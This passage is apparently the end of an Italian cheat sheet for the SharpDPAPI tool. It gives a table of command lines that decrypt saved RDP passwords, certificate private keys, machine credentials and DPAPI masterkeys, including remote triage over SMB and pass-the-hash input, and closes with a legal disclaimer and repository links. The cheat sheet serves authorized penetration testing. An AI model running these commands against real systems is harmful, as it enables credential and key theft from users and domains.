| **RDCMan passwords**     | `rdg /pvk:key.pvk`                                          | RDP saved connections   |
| **All credential types** | `triage /pvk:key.pvk`                                       | Comprehensive dump      |
| **Certificate keys**     | `certificates /pvk:key.pvk`                                 | Private key export      |
| **Remote triage**        | `triage /pvk:key.pvk /target:C:\Users\john /server:WKSTN01` | Via SMB                 |
| **Machine credentials**  | `machinecredentials /pvk:key.pvk`                           | SYSTEM context          |
| **Custom DPAPI blob**    | `blob /target:file.blob /pvk:key.pvk`                       | Arbitrary blob          |
| **With user password**   | `masterkeys /password:Pass123`                              | Offline scenario        |
| **With NTLM hash**       | `masterkeys /ntlm:32693b11...`                              | Pass-the-hash style     |

***

**Disclaimer:** SharpDPAPI è uno strumento per penetration testing autorizzato, security research e incident response. L'uso non autorizzato per furto di credenziali viola art. 615-ter c.p. (accesso abusivo) e art. 617-quater c.p. (intercettazione illecita comunicazioni). Utilizzare esclusivamente in ambienti controllati con autorizzazione scritta del proprietario del dominio Active Directory.

**Repository ufficiale:** [https://github.com/GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)\
**Autori:** @harmj0y, @leechristensen, @djhohnstein (GhostPack/SpecterOps)\
**Supporto:** GitHub Issues (progetto attivamente manutenuto)\
**Related tools:** SharpChrome (companion per Chrome), Mimikatz (dpapi module), DonPAPI (Python alternative)
